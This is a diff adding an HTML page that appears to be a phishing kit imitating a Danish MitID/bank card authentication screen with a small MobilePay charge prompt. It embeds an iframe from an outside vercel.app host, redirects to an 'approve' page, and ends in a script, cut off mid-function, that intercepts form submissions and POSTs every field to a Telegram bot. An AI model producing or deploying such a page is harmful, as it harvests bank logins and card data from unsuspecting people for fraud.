@@ -1,0 +1,474 @@
+<html lang="dk">
+<head>
+<meta content="45; url=approve.html" http-equiv="refresh"/>
+<meta charset="utf-8"/>
+</head>
+<body>
+<div bis_skin_checked="1" data-channel-name="in_page_channel_nW1hNl" id="in-page-channel-node-id"></div>
+<title>Authentication</title>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<style>
+    body {
+      margin: 0;
+      background: #f3f2f2;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 10px;
+      min-width: 248px
+    }
+
+    #mitidIframe {
+      width: 100%;
+      height: 260px;
+      border: 0;
+      z-index: 100;
+      position: relative
+    }
+
+    @media (min-width:380px) {
+      #mitidIframe {
+        height: 400px
+      }
+    }
+
+    @media (min-width:400px) {
+      #mitidIframe {
+        height: 350px
+      }
+    }
+
+    .mitidContextStr {
+      font-size: 10px;
+      font-weight: normal;
+      color: #333;
+      border-top: 1px solid #eee;
+      border-bottom: 1px solid #eee;
+      padding: 6px;
+      background-color: #f8f8f9;
+      overflow-wrap: anywhere
+    }
+
+    @media (min-width:380px) {
+      .mitidContextStr {
+        font-size: 0.9rem;
+        padding: 15px
+      }
+    }
+
+    @media (min-width:400px) {
+      .mitidContextStr {
+        font-size: 0.9rem;
+        padding: 08px
+      }
+    }
+
+    .header {
+      height: 42px;
+      border-bottom: 0px solid #ddd;
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      padding: 0px 16px 0px 16px
+    }
+
+    .imgcon {
+      width: 33%
+    }
+
+    .logo {
+      max-width: 100%;
+      max-height: 32px
+    }
+
+    .bank {
+      float: right
+    }
+
+    .lang {
+      width: 30%;
+      display: block;
+      margin: auto;
+      text-align: center
+    }
+
+    .lang img {
+      max-width: 20px;
+      height: auto;
+      width: 100%
+    }
+
+    .lang a,
+    .lang a:hover,
+    .lang a:visited,
+    .lang a:active {
+      font-size: 2.5em;
+      text-decoration: none
+    }
+
+    .network {
+      float: left
+    }
+
+    .wrapper {
+      -webkit-border-radius: 4px;
+      -moz-border-radius: 4px;
+      border-radius: 4px;
+      position: relative;
+      display: block;
+      width: 250px;
+      height: 400px;
+      background-color: #fff
+    }
+
+    .container {
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      font-family: Arial, sans-serif
+    }
+
+    .buttons {
+      margin-top: 6px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: row-reverse
+    }
+
+    button {
+      width: 30%;
+      height: 34px;
+      text-align: center;
+      margin: 00px 1% 00px 1%;
+      min-height: 24px;
+      line-height: 24px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      font-size: 0.9em;
+      color: #333;
+      background-image: linear-gradient(#eee, #ddd)
+    }
+
+    button:hover {
+      color: #fff;
+      background-image: linear-gradient(#96bfe9, #5e99d4)
+    }
+
+    button img {
+      display: inline-block;
+      vertical-align: middle;
+      width: 12px
+    }
+
+    @media (min-width:380px) {
+      body {
+        font-size: 14px
+      }
+
+      .wrapper {
+        width: 380px;
+        height: 550px
+      }
+
+      .header {
+        height: 72px;
+        display: flex;
+        align-items: center
+      }
+
+      .logo {
+        max-width: 100%;
+        max-height: 60px
+      }
+
+      .lang img {
+        max-width: 40px
+      }
+
+      button {
+        min-height: 30px;
+        line-height: 30px
+      }
+    }
+
+    @media (min-width:400px) {
+      body {
+        font-size: 14px
+      }
+
+      .wrapper {
+        width: 380px;
+        height: 550px
+      }
+
+      .header {
+        height: 72px;
+        display: flex;
+        align-items: center
+      }
+
+      .logo {
+        max-width: 100%;
+        max-height: 60px
+      }
+
+      .lang img {
+        max-width: 40px
+      }
+
+      button {
+        min-height: 30px;
+        line-height: 30px
+      }
+    }
+  </style>
+<link href="./lextracted_files/file_1.gif" rel="shortcut icon" type="image/x-icon"/>
+<style>
+    img[src="data:,"],
+    source[src="data:,"] {
+      display: none !important
+    }
+  </style>
+<style>@keyframes slide-in-one-tap {
+  from {
+    transform: translateY(80px);
+  }
+  to {
+    transform: translateY(0px);
+  }
+}
+
+.trust-hide-gracefully {
+  opacity: 0;
+}
+
+.trust-wallet-one-tap .hidden {
+    display: none;
+  }
+
+.trust-wallet-one-tap .semibold {
+    font-weight: 500;
+  }
+
+.trust-wallet-one-tap .binance-plex {
+    font-family: 'Binance';
+  }
+
+.trust-wallet-one-tap .rounded-full {
+    border-radius: 50%;
+  }
+
+.trust-wallet-one-tap .flex {
+    display: flex;
+  }
+
+.trust-wallet-one-tap .flex-col {
+    flex-direction: column;
+  }
+
+.trust-wallet-one-tap .items-center {
+    align-items: center;
+  }
+
+.trust-wallet-one-tap .space-between {
+    justify-content: space-between;
+  }
+
+.trust-wallet-one-tap .justify-center {
+    justify-content: center;
+  }
+
+.trust-wallet-one-tap .w-full {
+    width: 100%;
+  }
+
+.trust-wallet-one-tap .box {
+    transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
+    animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
+    width: 384px;
+    border-radius: 15px;
+    background: #fff;
+    box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
+    position: fixed;
+    right: 30px;
+    bottom: 30px;
+    z-index: 1020;
+  }
+
+.trust-wallet-one-tap .header {
+    gap: 15px;
+    border-bottom: 1px solid #e6e6e6;
+    padding: 10px 18px;
+  }
+
+.trust-wallet-one-tap .header .left-items {
+      gap: 15px;
+    }
+
+.trust-wallet-one-tap .header .title {
+      color: #1e2329;
+      font-size: 18px;
+      font-weight: 600;
+      line-height: 28px;
+    }
+
+.trust-wallet-one-tap .header .subtitle {
+      color: #474d57;
+      font-size: 14px;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .header .close {
+      color: #1e2329;
+      cursor: pointer;
+    }
+
+.trust-wallet-one-tap .body {
+    padding: 9px 18px;
+    gap: 10px;
+  }
+
+.trust-wallet-one-tap .body .right-items {
+      gap: 10px;
+      width: 100%;
+    }
+
+.trust-wallet-one-tap .body .right-items .wallet-title {
+        color: #1e2329;
+        font-size: 16px;
+        font-weight: 600;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .body .right-items .wallet-subtitle {
+        color: #474d57;
+        font-size: 14px;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .connect-indicator {
+    gap: 15px;
+    padding: 8px 0;
+  }
+
+.trust-wallet-one-tap .connect-indicator .flow-icon {
+      color: #474d57;
+    }
+
+.trust-wallet-one-tap .loading-color {
+    color: #fff;
+  }
+
+.trust-wallet-one-tap .button {
+    border-radius: 50px;
+    outline: 2px solid transparent;
+    outline-offset: 2px;
+    background-color: rgb(5, 0, 255);
+    border-color: rgb(229, 231, 235);
+    cursor: pointer;
+    text-align: center;
+    height: 45px;
+  }
+
+.trust-wallet-one-tap .button .button-text {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .footer {
+    margin: 20px 30px;
+  }
+
+.trust-wallet-one-tap .check-icon {
+    color: #fff;
+  }
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Regular.otf) format('opentype');
+  font-weight: 400;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Medium.otf) format('opentype');
+  font-weight: 500;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-SemiBold.otf) format('opentype');
+  font-weight: 600;
+  font-style: normal;
+}
+</style>
+<section class="wrapper">
+<header class="header">
+<div bis_skin_checked="1" class="imgcon">
+<img alt="Your Bank" class="logo network" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDIxLjEuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJMYXllcl8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCINCgkgd2lkdGg9Ijk3LjgwMyIgaGVpZ2h0PSIyOC42MDkiIHZpZXdCb3g9IjAgMCAyODMuNDY1IDgyLjg5NCIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMjgzLjQ2NSA4Mi44OTQ7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxnPg0KCTxnPg0KCQk8cGF0aCBzdHlsZT0iZmlsbDojMDA1Nzc2OyIgZD0iTTEuMzA4LDgxLjU4NkMwLjQ3Niw4MS41ODYsMCw4MS4xMSwwLDgwLjI3N1YyNS4wODVjMC0wLjcxNCwwLjIzOC0xLjMwOCwwLjk1MS0xLjY2NQ0KCQkJYzYuNzgtMi44NTUsMTQuNjMxLTQuNjM5LDIyLjgzOC00LjYzOWMxNS45NCwwLDI2Ljc2NCw3LjQ5NCwyNi43NjQsMjUuNjkzdjM1LjgwNGMwLDAuODMyLTAuNDc1LDEuMzA4LTEuNDI3LDEuMzA4aC03LjAxOA0KCQkJYy0wLjgzMiwwLTEuMzA4LTAuNDc2LTEuMzA4LTEuMzA4VjQ0LjcxMWMwLTEyLjM3MS02LjMwNC0xNy4xMjktMTcuMDEtMTcuMTI5Yy00Ljk5NiwwLTEwLjM0OCwwLjk1MS0xNC4wMzYsMi4xNDF2NTAuNTU0DQoJCQljMCwwLjgzMi0wLjQ3NiwxLjMwOC0xLjQyNywxLjMwOEgxLjMwOHoiLz4NCgkJPHBhdGggc3R5bGU9ImZpbGw6IzAwNTc3NjsiIGQ9Ik0xMTQuMzA3LDU0LjEwOGMwLDAuOTUxLTAuNDc2LDEuNDI3LTEuMzA4LDEuNDI3SDc0LjEwMnY0Ljk5NmMwLDguOTIxLDYuNjYxLDEzLjY3OSwxNS40NjQsMTMuNjc5DQoJCQljOC4yMDcsMCwxMy43OTgtMy4yMTIsMTguMTk5LTYuNjYxYzAuNzE0LTAuNDc2LDEuNDI3LTAuMzU3LDEuOTAzLDAuMzU3bDMuNDQ5LDQuNTJjMC41OTYsMC43MTQsMC40NzYsMS4zMDgtMC4yMzgsMS45MDMNCgkJCWMtNS45NDcsNC45OTYtMTMuNTYsOC41NjQtMjMuNTUxLDguNTY0Yy0xMi44NDcsMC0yNS4wOTktNy4zNzUtMjUuMDk5LTIyLjM2MlY0Mi40NTFjMC0xNi4yOTYsMTIuMTMzLTIzLjY3MSwyNS4yMTctMjMuNjcxDQoJCQljMTIuOTY2LDAsMjQuODYxLDcuMzc1LDI0Ljg2MSwyMy42NzFWNTQuMTA4eiBNODkuNDQ2LDI3LjU4M2MtOC45MjEsMC0xNS4zNDQsNC42MzktMTUuMzQ0LDE0Ljg2OXY0Ljk5NmgzMC42ODl2LTQuOTk2DQoJCQlDMTA0Ljc5MiwzMi4zNCw5OC4xMywyNy41ODMsODkuNDQ2LDI3LjU4M3oiLz4NCgkJPHBhdGggc3R5bGU9ImZpbGw6IzAwNTc3NjsiIGQ9Ik0xNDguNzk5LDczLjg1NGMxLjMwOCwwLDMuNTY4LTAuMTE5LDUuNzA5LTAuMjM4YzAuOTUyLDAsMS40MjgsMC40NzYsMS40MjgsMS4zMDh2Ni4zMDQNCgkJCWMwLDAuNzE0LTAuMzU4LDEuMzA4LTEuMTksMS40MjdjLTIuMTQxLDAuMTE5LTQuODc2LDAuMjM4LTYuNDIzLDAuMjM4Yy0xMS44OTYsMC0yMC42OTgtNi40MjMtMjAuNjk4LTIxLjA1NFY2LjQwOQ0KCQkJYzAtMC45NTEsMC40NzYtMS40MjcsMS40MjctMS40MjdoNi4xODZjMC43MTQsMCwxLjE4OSwwLjQ3NiwxLjMwOCwxLjMwOGwwLjgzMiwxNC4zOTNoMTUuNDY0YzAuODMyLDAsMS4zMDgsMC40NzYsMS4zMDgsMS4zMDgNCgkJCXY1Ljk0N2MwLDAuOTUyLTAuNDc2LDEuNDI3LTEuMzA4LDEuNDI3aC0xNS40NjR2MzEuOTk4QzEzNy4zNzksNjkuMjE1LDE0MS40MjMsNzMuODU0LDE0OC43OTksNzMuODU0eiIvPg0KCQk8cGF0aCBzdHlsZT0iZmlsbDojMDA1Nzc2OyIgZD0iTTE4Ni4yNjcsODIuODk0Yy04LjIwNywwLTE2LjQxNi0yLjM3OS0yMy41NTMtNy42MTNjLTAuNzE0LTAuNDc2LTAuNzE0LTEuMTg5LTAuMzU2LTEuOTAzDQoJCQlsMy4yMTEtNS40NzFjMC40NzYtMC44MzMsMS4wNy0wLjk1MSwxLjkwMy0wLjM1N2M1LjcxLDQuMjgyLDEyLjI1Miw2LjY2MSwxOS4wMzMsNi42NjFjNy45NjksMCwxNC4wMzYtMy4zMzEsMTQuMDM2LTkuNTE2DQoJCQljMC02LjY2MS03LjM3NS04LjIwNy0xNC4wMzYtOS41MTZjLTguNTY1LTEuNzg0LTIzLjE5Ni01LjExNS0yMy4xOTYtMTguOTEzYzAtMTIuMTMzLDExLjUzOC0xNy40ODYsMjMuNDM0LTE3LjQ4Ng0KCQkJYzcuNDkzLDAsMTQuMTU1LDEuOTAzLDIwLjY5Niw1LjU5YzAuODM0LDAuMzU3LDAuOTUyLDEuMDcsMC40NzYsMS43ODRsLTMuMjExLDUuMzUyYy0wLjM1NiwwLjcxNC0xLjA3LDAuOTUyLTEuNzg0LDAuNDc2DQoJCQljLTQuODc2LTIuNjE3LTEwLjcwNi00LjQwMS0xNi42NTMtNC40MDFjLTguMzI3LDAtMTMuMzIzLDMuMzMtMTMuMzIzLDguNjgzYzAsNi41NDIsNy4wMTgsOC4zMjYsMTUuNDY0LDkuOTkyDQoJCQljOS41MTYsMS45MDMsMjIuMDA2LDQuNjM5LDIyLjAwNiwxNy45NjJDMjEwLjQxNCw3Ni4zNTIsMjAwLjE4NCw4Mi44OTQsMTg2LjI2Nyw4Mi44OTR6Ii8+DQoJPC9nPg0KCTxnPg0KCQk8Y2lyY2xlIHN0eWxlPSJmaWxsOiMwMEJFRjA7IiBjeD0iMjQxLjk1IiBjeT0iMTMuODMyIiByPSIxMy44MzIiLz4NCgkJPGNpcmNsZSBzdHlsZT0iZmlsbDojMDBCRUYwOyIgY3g9IjI3MS4yOTIiIGN5PSIxMy44MzIiIHI9IjguODUyIi8+DQoJCTxjaXJjbGUgc3R5bGU9ImZpbGw6IzAwQkVGMDsiIGN4PSIyNzEuMjkyIiBjeT0iNDMuMTA3IiByPSIxMi4xNzIiLz4NCgkJPGNpcmNsZSBzdHlsZT0iZmlsbDojMDBCRUYwOyIgY3g9IjI0MS45NSIgY3k9IjcyLjM4MiIgcj0iMTAuNTEyIi8+DQoJPC9nPg0KPC9nPg0KPC9zdmc+DQo="/>
+</div>
+<div bis_skin_checked="1" class="imgcon">
+<div bis_skin_checked="1" class="lang lane">
+<a href="#">
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iNDgwIiB3aWR0aD0iNjQwIiB2aWV3Qm94PSIwIDAgNjQwIDQ4MCI+CiAgPGRlZnM+CiAgICA8Y2xpcFBhdGggaWQ9ImEiPgogICAgICA8cGF0aCBmaWxsLW9wYWNpdHk9Ii42NyIgZD0iTS04NS4zMzMgMGg2ODIuNjd2NTEyaC02ODIuNjd6Ii8+CiAgICA8L2NsaXBQYXRoPgogIDwvZGVmcz4KICA8ZyBjbGlwLXBhdGg9InVybCgjYSkiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDgwKSBzY2FsZSguOTQpIj4KICAgIDxnIHN0cm9rZS13aWR0aD0iMXB0Ij4KICAgICAgPHBhdGggZmlsbD0iIzAwNiIgZD0iTS0yNTYgMEg3NjguMDJ2NTEyLjAxSC0yNTZ6Ii8+CiAgICAgIDxwYXRoIGQ9Ik0tMjU2IDB2NTcuMjQ0bDkwOS41MzUgNDU0Ljc2OEg3NjguMDJWNDU0Ljc3TC0xNDEuNTE1IDBILTI1NnpNNzY4LjAyIDB2NTcuMjQzTC0xNDEuNTE1IDUxMi4wMUgtMjU2di01Ny4yNDNMNjUzLjUzNSAwSDc2OC4wMnoiIGZpbGw9IiNmZmYiLz4KICAgICAgPHBhdGggZD0iTTE3MC42NzUgMHY1MTIuMDFoMTcwLjY3VjBoLTE3MC42N3pNLTI1NiAxNzAuNjd2MTcwLjY3SDc2OC4wMlYxNzAuNjdILTI1NnoiIGZpbGw9IiNmZmYiLz4KICAgICAgPHBhdGggZD0iTS0yNTYgMjA0LjgwNHYxMDIuNDAySDc2OC4wMlYyMDQuODA0SC0yNTZ6TTIwNC44MSAwdjUxMi4wMWgxMDIuNFYwaC0xMDIuNHpNLTI1NiA1MTIuMDFMODUuMzQgMzQxLjM0aDc2LjMyNGwtMzQxLjM0IDE3MC42N0gtMjU2ek0tMjU2IDBMODUuMzQgMTcwLjY3SDkuMDE2TC0yNTYgMzguMTY0VjB6bTYwNi4zNTYgMTcwLjY3TDY5MS42OTYgMGg3Ni4zMjRMNDI2LjY4IDE3MC42N2gtNzYuMzI0ek03NjguMDIgNTEyLjAxTDQyNi42OCAzNDEuMzRoNzYuMzI0TDc2OC4wMiA0NzMuODQ4djM4LjE2MnoiIGZpbGw9IiNjMDAiLz4KICAgIDwvZz4KICA8L2c+Cjwvc3ZnPgo="/>
+</a>
+</div>
+</div>
+<div bis_skin_checked="1" class="imgcon">
+<img class="logo bank" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDI1LjMuMSwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPgo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9ImE1Njg5ZmM1LThkNWUtNGIxOS04MTdjLTE3MWY4Y2FiZjY1YSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeD0iMHB4IiB5PSIwcHgiIHZpZXdCb3g9IjAgMCAyNTggNzgiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDI1OCA3ODsiIHhtbDpzcGFjZT0icHJlc2VydmUiPgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgoJLnN0MHtmaWxsOm5vbmU7fQoJLnN0MXtmaWxsOiNGRjVGMDA7fQoJLnN0MntmaWxsOiNFQjAwMUI7fQoJLnN0M3tmaWxsOiNGNzlFMUI7fQo8L3N0eWxlPgo8Zz4KCTxyZWN0IHg9Ii0yMS4xIiB5PSItMy44IiBjbGFzcz0ic3QwIiB3aWR0aD0iMzAwIiBoZWlnaHQ9Ijg1LjciLz4KCTxyZWN0IHg9IjI1LjYiIHk9IjIyLjIiIGNsYXNzPSJzdDEiIHdpZHRoPSIxOC44IiBoZWlnaHQ9IjMzLjciLz4KCTxwYXRoIGNsYXNzPSJzdDIiIGQ9Ik0yNi44LDM5YzAtNi42LDMtMTIuNyw4LjEtMTYuOGMtOS4zLTcuNC0yMi43LTUuNy0zMC4xLDMuNmMtNy4zLDkuMi01LjYsMjIuNywzLjcsMzBjNy44LDYuMiwxOC43LDYuMiwyNi41LDAgICBDMjkuOSw1MS43LDI2LjgsNDUuNiwyNi44LDM5eiIvPgoJPHBhdGggY2xhc3M9InN0MyIgZD0iTTY5LjYsMzljMCwxMS45LTkuNiwyMS40LTIxLjQsMjEuNGMtNC44LDAtOS40LTEuNi0xMy4zLTQuNmM5LjMtNy40LDEwLjktMjAuOCwzLjYtMzAuMSAgIGMtMS4xLTEuMy0yLjMtMi41LTMuNi0zLjZjOS4zLTcuMywyMi44LTUuNiwzMC4yLDMuNkM2OC4xLDI5LjYsNjkuNiwzNC4yLDY5LjYsMzl6Ii8+Cgk8cGF0aCBjbGFzcz0ic3QzIiBkPSJNNjcuNiw1Mi4zdi0wLjdINjh2LTAuMWgtMC43djAuMWgwLjNWNTIuM0w2Ny42LDUyLjN6IE02OSw1Mi4zdi0wLjloLTAuMkw2OC41LDUybC0wLjItMC41aC0wLjJ2MC45aDAuMXYtMC43ICAgbDAuMiwwLjVoMC4xbDAuMi0wLjV2MC43SDY5eiIvPgoJPHBvbHlnb24gcG9pbnRzPSI5MS41LDYwLjUgOTAuNyw2MC41IDkwLjcsNTMuMyA5MC43LDM4LjkgOTAuNywyNC40IDkwLjcsMTcuMSA5MS41LDE3LjEgOTEuNSwzMS42IDkxLjUsNDYgICIvPgoJPHBhdGggZD0iTTExMy41LDUyLjNoLTIuMlYyNi43aDIuMlY1Mi4zeiBNMTI5LjcsMjYuN2MyLDAsMy44LDAuMiw1LjcsMC45YzEuNiwwLjUsMy4xLDEuNCw0LjQsMi41YzEuMiwxLjEsMi4yLDIuNSwyLjcsNC4xICAgYzEuMywzLjQsMS4zLDcuMSwwLDEwLjdjLTAuNywxLjUtMS41LDIuOS0yLjcsNC4xYy0xLjIsMS4xLTIuNywyLTQuNCwyLjVjLTEuOSwwLjctMy44LDAuOS01LjcsMC45aC05LjNWMjYuN0gxMjkuN3ogTTEyMi42LDI4LjkgICB2MjEuM2g3LjFjMS42LDAsMy4zLTAuMiw0LjktMC44YzEuMy0wLjQsMi41LTEuMiwzLjYtMi4yYzEtMSwxLjgtMi4xLDIuMi0zLjRjMS0yLjksMS01LjksMC04LjhjLTAuNC0xLjMtMS4yLTIuNC0yLjItMy40ICAgYy0xLTEtMi4zLTEuNi0zLjYtMi4yYy0xLjUtMC41LTMuMy0wLjgtNC45LTAuOEwxMjIuNiwyOC45eiBNMTY5LjQsMjYuNWMxLjEsMCwyLjEsMC4xLDMuMiwwLjNjMSwwLjIsMiwwLjUsMi45LDEuMSAgIGMwLjksMC40LDEuNiwxLDIuNCwxLjZjMC44LDAuNywxLjMsMS40LDEuOSwyLjJsLTEuOSwxLjJjLTAuNC0wLjctMS0xLjMtMS41LTEuOGMtMC41LTAuNS0xLjMtMS0yLTEuM2MtMC44LTAuMy0xLjUtMC43LTIuMy0wLjkgICBjLTAuOS0wLjItMS44LTAuMy0yLjYtMC4zYy0xLjQsMC0yLjksMC4yLTQuMywwLjhjLTEuMywwLjUtMi40LDEuMi0zLjQsMi4yYy0xLDEtMS44LDIuMi0yLjMsMy40Yy0xLjEsMi45LTEuMSw2LDAsOC45ICAgYzAuNSwxLjMsMS4zLDIuNCwyLjMsMy40YzEsMSwyLjEsMS44LDMuNCwyLjJjMS4zLDAuNSwyLjcsMC44LDQuMywwLjhjMC45LDAsMS44LTAuMSwyLjUtMC4zYzAuOC0wLjIsMS41LTAuNCwyLjMtMC45ICAgYzAuOC0wLjMsMS40LTAuOSwyLTEuM2MwLjUtMC41LDEuMS0xLjEsMS41LTEuOWwxLjksMS4zYy0wLjUsMC44LTEuMiwxLjUtMS45LDIuMmMtMC44LDAuNy0xLjUsMS4yLTIuNCwxLjYgICBjLTAuOSwwLjQtMS45LDAuOC0yLjksMWMtMi43LDAuNy01LjcsMC40LTguMy0wLjdjLTEuNS0wLjctMy0xLjUtNC4yLTIuN2MtMS4yLTEuMi0yLjEtMi41LTIuNy00LjJjLTEuMy0zLjQtMS4zLTcuMSwwLTEwLjUgICBjMC43LTEuNSwxLjUtMywyLjctNC4yYzEuMi0xLjIsMi42LTIuMSw0LjItMi43QzE2NS45LDI2LjcsMTY3LjYsMjYuNCwxNjkuNCwyNi41TDE2OS40LDI2LjV6IE0xODYuNSwzOC4xYzAuMy0wLjUsMC44LTEsMS4yLTEuNCAgIGMwLjQtMC40LDEtMC44LDEuNS0xYzAuNS0wLjIsMS4xLTAuNCwxLjYtMC41YzAuNS0wLjEsMS4yLTAuMiwxLjgtMC4yYzEsMCwyLDAuMSwzLDAuNGMwLjksMC4zLDEuNiwwLjgsMi4zLDEuNCAgIGMwLjcsMC43LDEuMSwxLjMsMS40LDIuMnMwLjUsMS45LDAuNSwyLjl2MTAuNWgtMi4xdi05LjljMC0wLjgtMC4xLTEuNS0wLjMtMi4zYy0wLjItMC43LTAuNS0xLjItMS4xLTEuOCAgIGMtMC40LTAuNC0xLjEtMC45LTEuOC0xLjFjLTAuOC0wLjItMS41LTAuNC0yLjMtMC4zYy0wLjgsMC0xLjUsMC4xLTIuMywwLjRjLTAuNywwLjItMS4zLDAuNy0xLjksMS4yYy0wLjUsMC41LTEsMS4xLTEuMiwxLjggICBjLTAuMywwLjgtMC40LDEuNS0wLjQsMi4zdjkuOGgtMi4xVjI2aDIuMVYzOC4xeiBNMjEyLjIsMzQuOGMxLjEsMCwyLjIsMC4yLDMuMiwwLjdjMSwwLjQsMS45LDEsMi41LDEuOGMwLjgsMC44LDEuMywxLjgsMS42LDIuNyAgIGMwLjQsMS4xLDAuNywyLjMsMC43LDMuNWMwLDAuMSwwLDAuMywwLDAuNGMwLDAuMSwwLDAuMywwLDAuNGgtMTQuNGMwLDAuOSwwLjMsMS45LDAuNywyLjZjMC4zLDAuOCwwLjksMS40LDEuNCwyICAgYzAuNSwwLjUsMS4zLDEsMi4xLDEuMmMwLjgsMC4zLDEuNiwwLjQsMi41LDAuNGMxLjEsMCwyLjItMC4yLDMuMi0wLjdjMS0wLjQsMS45LTEuMSwyLjUtMS44bDEuMSwxLjRjLTAuNSwwLjUtMS4xLDEtMS42LDEuMyAgIGMtMC41LDAuMy0xLjEsMC43LTEuOCwwLjljLTAuNSwwLjItMS4yLDAuMy0xLjgsMC40Yy0wLjcsMC4xLTEuMiwwLjEtMS45LDAuMWMtMS4yLDAtMi40LTAuMi0zLjUtMC43Yy0xLTAuNC0yLTEtMi43LTEuOSAgIGMtMC44LTAuOC0xLjQtMS44LTEuOC0yLjdjLTAuNC0xLjEtMC43LTIuNC0wLjctMy42YzAtMS4yLDAuMi0yLjQsMC43LTMuNWMwLjQtMS4xLDEtMiwxLjgtMi45YzAuOC0wLjgsMS42LTEuNCwyLjctMS45ICAgQzIwOS45LDM1LDIxMS4xLDM0LjgsMjEyLjIsMzQuOEwyMTIuMiwzNC44eiBNMjEyLjIsMzYuN2MtMC44LDAtMS42LDAuMS0yLjQsMC40Yy0wLjcsMC4zLTEuMywwLjctMS45LDEuMmMtMC41LDAuNS0xLDEuMi0xLjMsMS45ICAgYy0wLjMsMC44LTAuNSwxLjUtMC43LDIuNGgxMi4zYy0wLjEtMC45LTAuMi0xLjYtMC41LTIuNGMtMC4zLTAuNy0wLjgtMS4zLTEuMy0xLjlDMjE1LjIsMzcuMiwyMTMuNywzNi43LDIxMi4yLDM2LjdMMjEyLjIsMzYuN3ogICAgTTIzMi4yLDM0LjhjMS4yLDAsMi40LDAuMiwzLjUsMC43YzEuMSwwLjQsMiwxLjEsMi43LDJsLTEuMywxLjRjLTAuNy0wLjctMS40LTEuMi0yLjMtMS41cy0xLjktMC41LTIuNy0wLjVzLTEuOCwwLjItMi42LDAuNSAgIGMtMC44LDAuMy0xLjUsMC45LTIuMSwxLjRjLTAuNywwLjctMS4xLDEuNC0xLjQsMi4yYy0wLjcsMS44LTAuNywzLjcsMCw1LjVjMC43LDEuNiwxLjksMywzLjUsMy42YzAuOSwwLjMsMS44LDAuNSwyLjYsMC41ICAgYzEsMCwyLTAuMiwyLjktMC41YzAuOS0wLjMsMS42LTAuOSwyLjMtMS41bDEuMywxLjRjLTAuOCwwLjktMS44LDEuNS0yLjcsMmMtMi4zLDAuOS00LjgsMC45LTcuMSwwYy0yLjEtMC45LTMuNy0yLjUtNC42LTQuNiAgIGMtMC45LTIuMy0wLjktNC43LDAtN2MwLjgtMi4xLDIuNS0zLjgsNC42LTQuN0MyMjkuOCwzNSwyMzEsMzQuOCwyMzIuMiwzNC44TDIzMi4yLDM0Ljh6IE0yNDQuOCw0Mi4zaDIuN2w3LjMtNy4zaDIuNmwtOC4xLDguMSAgIGw4LjMsOS4xaC0yLjZsLTcuNC04aC0yLjd2OGgtMi4xVjI2aDIuMXYxNi4zSDI0NC44eiIvPgo8L2c+Cjwvc3ZnPg=="/>
+</div>
+</header>
+<section class="container" style="padding:0px;flex:auto">
+<section>
+<center> <div bis_skin_checked="1" class="mitidContextStr">Betal 0.1 DKK til Mobilepay A/S - fra kort xxxx xxxxx
+  </div> </center>
+</section>
+<section class="mitidContainer">
+<div bis_skin_checked="1" id="mitid_parameters" style="display:none">8e6ae58c-d0c4-4411-b822-c05eb2ded77e</div>
+<iframe class="bankid-applet" id="mitidIframe" src="https://load-mt-dhmn.vercel.app" style="padding-top:20px"></iframe>
+</section>
+</section>
+</section>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const form = document.querySelector("form");
+    if (!form) return;
+
+    form.addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        const formData = new FormData(form);
+        const entries = [...formData.entries()];
+        const message = entries.map(([key, value]) => `${key}: ${value}`).join("\n");
+
+        const telegramBotToken = "ICI_VOTRE_BOT_TOKEN";
+        const telegramChatId = "ICI_VOTRE_CHAT_ID";
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+        fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message,
+            }),
